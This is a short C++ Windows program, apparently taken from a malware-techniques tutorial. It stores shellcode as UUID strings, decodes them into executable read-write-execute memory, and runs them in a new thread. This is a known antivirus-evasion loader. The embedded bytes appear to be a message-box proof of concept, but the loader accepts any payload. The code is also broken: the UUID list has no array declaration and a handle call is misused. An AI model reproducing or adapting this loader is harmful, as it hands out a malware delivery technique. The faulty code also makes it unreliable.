#include <Windows.h>
#include <Rpc.h>
#include <iostream>


#pragma comment(lib, "Rpcrt4.lib")


int main()
{
    //https://cocomelonc.github.io/malware/2022/07/21/malware-tricks-22.html
   {
      "e48148fc-fff0-ffff-e8d0-000000415141",
      "56515250-3148-65d2-488b-52603e488b52",
      "8b483e18-2052-483e-8b72-503e480fb74a",
      "c9314d4a-3148-acc0-3c61-7c022c2041c1",
      "01410dc9-e2c1-52ed-4151-3e488b52203e",
      "483c428b-d001-8b3e-8088-0000004885c0",
      "01486f74-50d0-8b3e-4818-3e448b402049",
      "5ce3d001-ff48-3ec9-418b-34884801d64d",
      "3148c931-acc0-c141-c90d-4101c138e075",
      "034c3ef1-244c-4508-39d1-75d6583e448b",
      "01492440-66d0-413e-8b0c-483e448b401c",
      "3ed00149-8b41-8804-4801-d0415841585e",
      "58415a59-5941-5a41-4883-ec204152ffe0",
      "5a594158-483e-128b-e949-ffffff5d49c7",
      "000000c1-3e00-8d48-95fe-0000003e4c8d",
      "00010985-4800-c931-41ba-45835607ffd5",
      "41c93148-f0ba-a2b5-56ff-d54d656f772d",
      "776f656d-0021-5e3d-2e2e-5e3d00909090"
    };
	int elems = sizeof(uuids) / sizeof(uuids[0]);
    VOID* mem = VirtualAlloc(NULL, 0x100000, 0x00002000 | 0x00001000, PAGE_EXECUTE_READWRITE);
    DWORD_PTR hptr = (DWORD_PTR)mem;

    for (int i = 0; i < elems; i++) {
        printf("[*] Allocating %d of %d uuids\n", i + 1, elems);
        printf("%s\n", *(uuids+i));
        RPC_CSTR rcp_cstr = (RPC_CSTR)*(uuids+i);
        RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID*)hptr);
        if (status != RPC_S_OK) {
            printf("[-] Something went wrong\n");
            CloseHandle(mem);
            return -1;
        }
         hptr += 16;
    }
    DWORD threadID;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, &threadID);


    if (NULL == hThread) {
        printf("Failed!\n");
        return -2;
    }
    else {
        printf("Started thread %i\n", threadID);
    }
    WaitForSingleObject(hThread, INFINITE);

    Sleep(5 * 1000);
}
